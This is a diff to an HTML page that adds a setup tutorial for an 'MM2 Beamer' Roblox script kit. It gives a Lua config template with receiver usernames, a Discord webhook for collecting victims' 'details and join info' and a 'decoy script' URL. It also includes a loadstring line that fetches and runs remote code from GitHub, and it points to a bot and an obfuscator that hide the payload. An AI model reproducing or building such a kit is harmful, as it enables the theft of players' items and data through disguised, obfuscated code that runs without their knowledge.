@@ -36,10 +36,68 @@
 </main>
 
 <!-- ✅ Tutorial Section Should Be Outside <main> -->
-<section id="tutorialPage" class="hidden">
-  <h2>📘 Script Generator Tutorial</h2>
-  <p>Welcome! This is where we’ll explain how to use the app step-by-step.</p>
-  <button id="backBtn">🔙 Back</button>
+<section id="tutorialPage" class="hidden output-card" style="max-width: 600px; margin: 30px auto; padding: 30px; font-family: 'Segoe UI', sans-serif; color: #f0f0f0; background: rgba(255, 255, 255, 0.05); border-radius: 16px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 8px 20px rgba(0,0,0,0.3);">
+
+  <h2>🌿 MM2 Beamer Script Setup</h2>
+
+  <p>You can either manually enter your details or use our custom bot to generate your script automatically.</p>
+
+  <hr style="margin: 20px 0; border: 0; border-top: 1px solid rgba(255,255,255,0.1);"/>
+
+  <h3>🔧 Manual Setup</h3>
+
+  <p>Copy the following code and then update the placeholders with your actual information:</p>
+
+  <pre style="background: #1c1c1c; padding: 16px; border-radius: 12px; overflow-x: auto; font-family: monospace;">
+Config = {
+  Receivers = {"username"},
+  Webhook = "Webhook url",
+  ScriptURL = "Raw GitHub https",
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BOT-SCRIPT/refs/heads/main/Main%20Script"))()
+  </pre>
+
+  <h4>🔌 What to Fill In:</h4>
+  <ul style="list-style-type: disc; margin-left: 20px;">
+    <li>Receivers: Your Roblox username (⚠️ Not your display name)</li>
+    <li>Webhook: A valid Discord webhook URL — this is where details and join info will be sent.</li>
+    <li>ScriptURL: A raw GitHub URL for the decoy script.</li>
+  </ul>
+
+  <p style="font-weight: bold; color: #ff6666;">⚠️ Make sure the URL is in raw format (https://raw.githubusercontent.com/...) and does not contain a loadstring in the script if you took it from the web.</p>
+
+  <h3>🤖 Or Use Our Bot (Easier)</h3>
+  <p>Use the command:</p>
+  <pre style="background: #1c1c1c; padding: 10px 16px; border-radius: 12px; font-family: monospace;">/create_script</pre>
+  <p>in <code>&lt;#1368630892032950354&gt;</code><br/>
+  Our bot will automatically generate your custom script and send it to you via DM — both as text and a downloadable <code>.lua</code> file.</p>
+
+  <p>Both options work the same way.<br/>
+  The only difference: our bot fills it out for you — faster and error-free.</p>
+
+  <p>If there’s any problems just @ Us or private DM with the problem <em>(Note: Our bot is not going to be on 24/7 but still @ us if it’s offline)</em></p>
+
+  <h3>⚒️ For our lua obfuscator we use this or you could use Moose</h3>
+  <p><a href="https://luaobfuscator.com/" target="_blank" rel="noopener" style="color:#BB86FC;">https://luaobfuscator.com/</a></p>
+
+  <!-- Back Button separated and bigger -->
+  <div style="text-align: center; margin-top: 40px;">
+    <button id="backBtn" style="
+      background: linear-gradient(to right, #9B5FFF, #BB86FC);
+      border: none;
+      border-radius: 16px;
+      padding: 16px 40px;
+      font-size: 1.25rem;
+      font-weight: bold;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    ">
+      🔙 Back
+    </button>
+  </div>
+
 </section>
 
       <section id="output" class="output-card hidden">
